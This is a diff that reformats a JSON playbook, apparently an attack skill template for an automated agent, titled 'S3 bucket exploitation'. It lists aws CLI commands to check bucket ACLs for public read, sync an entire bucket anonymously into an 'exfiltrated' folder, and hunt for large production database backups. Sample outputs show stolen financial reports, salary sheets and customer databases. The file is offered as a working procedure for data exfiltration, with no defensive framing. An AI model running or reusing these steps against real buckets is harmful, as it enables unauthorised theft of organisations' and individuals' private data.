@@ -2,21 +2,74 @@
   "name": "s3_bucket_exploitation",
   "description": "S3 bucket reconnaissance, enumeration, and data exfiltration",
   "pattern": "s3.*bucket|s3.*exfil|bucket.*enum|aws.*storage",
-  "parameters": ["bucket_name", "region"],
+  "parameters": [
+    "bucket_name",
+    "region"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aws", "args": ["s3api", "get-bucket-acl", "--bucket", "sensitive-documents"]},
-      "expected_output": {"type": "string", "example": "{\n    \"Owner\": {...},\n    \"Grants\": [\n        {\n            \"Grantee\": {\"Type\": \"Group\", \"URI\": \"http://acs.amazonaws.com/groups/global/AllUsers\"},\n            \"Permission\": \"READ\"\n        }\n    ]\n}\n\nPublic read access! AllUsers can read bucket."}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "s3api",
+          "get-bucket-acl",
+          "--bucket",
+          "sensitive-documents"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n    \"Owner\": {...},\n    \"Grants\": [\n        {\n            \"Grantee\": {\"Type\": \"Group\", \"URI\": \"http://acs.amazonaws.com/groups/global/AllUsers\"},\n            \"Permission\": \"READ\"\n        }\n    ]\n}\n\nPublic read access! AllUsers can read bucket."
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aws", "args": ["s3", "sync", "s3://sensitive-documents", "./exfiltrated/", "--no-sign-request"]},
-      "expected_output": {"type": "string", "example": "download: s3://sensitive-documents/financial-report-2023.pdf to exfiltrated/financial-report-2023.pdf\ndownload: s3://sensitive-documents/employee-salaries.xlsx to exfiltrated/employee-salaries.xlsx\ndownload: s3://sensitive-documents/customer-database.csv to exfiltrated/customer-database.csv\n\n2,847 files downloaded (8.4 GB)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "s3",
+          "sync",
+          "s3://sensitive-documents",
+          "./exfiltrated/",
+          "--no-sign-request"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "download: s3://sensitive-documents/financial-report-2023.pdf to exfiltrated/financial-report-2023.pdf\ndownload: s3://sensitive-documents/employee-salaries.xlsx to exfiltrated/employee-salaries.xlsx\ndownload: s3://sensitive-documents/customer-database.csv to exfiltrated/customer-database.csv\n\n2,847 files downloaded (8.4 GB)"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aws", "args": ["s3api", "list-objects-v2", "--bucket", "backup-database-dumps", "--query", "Contents[?Size>`1000000000`]"]},
-      "expected_output": {"type": "string", "example": "[\n    {\n        \"Key\": \"mysql-prod-2024-01-15.sql.gz\",\n        \"Size\": 4294967296,\n        \"LastModified\": \"2024-01-15T02:00:15.000Z\"\n    }\n]\n\nLarge database backup found (4GB). Downloading..."}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "s3api",
+          "list-objects-v2",
+          "--bucket",
+          "backup-database-dumps",
+          "--query",
+          "Contents[?Size>`1000000000`]"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[\n    {\n        \"Key\": \"mysql-prod-2024-01-15.sql.gz\",\n        \"Size\": 4294967296,\n        \"LastModified\": \"2024-01-15T02:00:15.000Z\"\n    }\n]\n\nLarge database backup found (4GB). Downloading..."
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
